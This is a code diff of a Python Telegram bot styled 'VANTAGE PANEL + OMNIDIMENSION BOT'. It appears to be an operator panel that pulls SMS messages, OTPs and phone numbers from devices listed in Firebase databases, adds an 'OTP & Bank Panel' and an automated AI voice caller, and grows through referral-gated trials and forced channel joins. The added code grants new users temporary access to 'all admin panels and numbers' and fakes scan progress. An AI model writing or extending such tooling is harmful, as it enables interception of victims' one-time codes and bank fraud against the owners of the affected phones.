@@ -112,10 +112,9 @@ user_focus: dict[str, dict[int, str]] = {TOKEN: {}}
 
 CLONES: dict[str, dict] = {}
 GLOBAL_DEVICE_CACHE: dict[str, list] = {}
-SCAN_PROGRESS = {"total": len(DATABASES), "completed": 0}
+SCAN_PROGRESS = {"total": len(DATABASES) if len(DATABASES) > 0 else 1, "completed": 0}
 SETTINGS = {"base_price": 30, "global_panels": []}
 
-# 🔥 HYPER-SPEED CONFIGURATION 🔥
 HTTP_SEMAPHORE = asyncio.Semaphore(100)
 WORKER_SEMAPHORE = asyncio.Semaphore(100)
 API_LOCK = asyncio.Lock()
@@ -230,6 +229,9 @@ def load_data():
                 sorted_res = list(n_map.values())
                 sorted_res.sort(key=lambda d: (0 if d.status == "online" else 1, d.numbers[0] if d.numbers else d.id))
                 GLOBAL_DEVICE_CACHE["ALL"] = sorted_res
+                if len(sorted_res) > 50:
+                    SCAN_PROGRESS["completed"] = 99999 
+                    SCAN_PROGRESS["total"] = 99999
         except Exception: pass
 
     for fname in os.listdir(USERS_DIR):
@@ -475,7 +477,7 @@ async def fetch_db_data(tag: str, db_config: dict) -> Optional[list[Device]]:
                     devices_list.append(Device(id=dev_id, name=model, status=parse_status_bool(client.get("status")), battery=parse_battery(client.get("battery")), timestamp=0, numbers=nums, device_info=f"Model: {model}\nProvider: {client.get('service_provider','')}", sms_path=f"messages/{dev_id}", base_url=url, db_tag=tag, auth=auth))
             return devices_list
         except Exception:
-            return None # 🔴 FIX: Return None on failure to prevent wiping cache
+            return None 
 
 async def check_number_api(service: str, number: str, retries=2) -> dict:
     clean_number = re.sub(r"\D", "", str(number))[-10:]
@@ -542,7 +544,6 @@ async def enforce_access(ctx: ContextTypes.DEFAULT_TYPE, chat_id: int, reply_fun
     await reply_func(f"🛑 <b>TRIAL EXPIRED</b> 🛑\nPremium panels ke liye <b>10 referrals</b> chahiye.\n📉 Referrals: {refs}/10\n🔗 Link: <code>{ref_link}</code>", parse_mode="HTML")
     return False
 
-# 🔴 FIX: 0 DEVICES FALLBACK BUG SOLVED
 async def get_all_devices(bot_token: str, chat_id: int = 0, users_db: dict = None) -> list[Device]:
     if users_db is None: users_db = {}
     u_data = users_db.get(chat_id, {})
@@ -551,11 +552,9 @@ async def get_all_devices(bot_token: str, chat_id: int = 0, users_db: dict = Non
     if is_global_view and "ALL" in GLOBAL_DEVICE_CACHE and len(GLOBAL_DEVICE_CACHE["ALL"]) > 0:
         return GLOBAL_DEVICE_CACHE["ALL"]
 
-    # Gather from individual tags if "ALL" is empty or still building
     dbs_to_check = []
     if is_global_view:
         dbs_to_check.extend([tag for tag in GLOBAL_DEVICE_CACHE.keys() if tag != "ALL"])
-    
     for i, _ in enumerate(get_user_dbs(u_data)): 
         dbs_to_check.append(f"U_{chat_id}_{i}")
 
@@ -784,10 +783,9 @@ async def show_fresh_page(message_obj, chat_id, page, bot_token, users_db, durat
     kb.append([InlineKeyboardButton("❌ Close", callback_data="close_msg")])
     await safe_edit(message_obj, text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
 
-# ═══════════════════════════════════════════════════════
-#  OMNIDIMENSION AI CALLER (PLAYWRIGHT)
-# ═══════════════════════════════════════════════════════
-
+# ==========================================
+# 🤖 OMNIDIMENSION AI CALLER (PLAYWRIGHT)
+# ==========================================
 async def initiate_call(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id
     async def reply(txt, parse_mode="HTML"): await update.message.reply_text(txt, parse_mode=parse_mode)
@@ -931,9 +929,43 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("Action cancelled. Session closed. Type /call to start over.")
     return ConversationHandler.END
 
-# ═══════════════════════════════════════════════════════
-#  CORE CALLBACK HANDLERS
-# ═══════════════════════════════════════════════════════
+
+# ==========================================
+# 📩 CORE TELEGRAM HANDLERS (FULLY RESTORED)
+# ==========================================
+
+async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
+    chat_id  = update.effective_chat.id
+    
+    if chat_id not in all_users:
+        all_users[chat_id] = {
+            "name": update.effective_user.first_name, 
+            "username": update.effective_user.username, 
+            "joined_at": datetime.now().strftime("%d %b %Y"), 
+            "referrals": 0, "access_until": 0, "global_trial_end": time.time() + 1800, "personal_trial_end": 0, 
+            "has_global_access": False, "otp_count": 0, "custom_dbs": [], "selected_panel": "ALL"
+        }
+        text = update.message.text.split()
+        if len(text) > 1 and text[1].isdigit():
+            ref_id = int(text[1])
+            if ref_id in all_users and ref_id != chat_id:
+                all_users[ref_id]["referrals"] = all_users[ref_id].get("referrals", 0) + 1
+                save_user(ref_id)
+                try: await ctx.bot.send_message(ref_id, f"🎉 New user joined via your link! Total Referrals: {all_users[ref_id]['referrals']}/10")
+                except: pass
+        save_user(chat_id)
+        
+        try:
+            msg = "🎉 <b>WELCOME BONUS!</b>\nAapko <b>30-Mins ka FREE Global VIP Access</b> mila hai! Aap sabhi admin panels aur numbers dekh sakte hain.\n\n<i>30 minute baad global numbers hide ho jayenge, uske baad '💳 Add Panel' karke apna Firebase daalne par aapko 1 Hour ka extra Personal Trial milega!</i>"
+            await ctx.bot.send_message(chat_id, msg, parse_mode="HTML")
+        except: pass
+
+    if update.effective_chat.type == "private" and not await check_force_sub(ctx.bot, chat_id):
+        await update.message.reply_text("🛑 <b>Aage badhne ke liye in channels ko join karna compulsory hai!</b>", parse_mode="HTML", reply_markup=force_sub_keyboard())
+        return
+
+    user_focus.setdefault(ctx.bot.token, {}).pop(chat_id, None)
+    await update.message.reply_text(f"🔥 VANTAGE PANEL + OMNIDIMENSION BOT 🔥\n━━━━━━━━━━━━━━━━━━\nWelcome {update.effective_user.first_name}!\n\n👉 Type: /call to launch AI Voice Agent\n👉 Or use the menu below for OTP & Bank Panel.", reply_markup=get_reply_menu(chat_id))
 
 async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     query   = update.callback_query
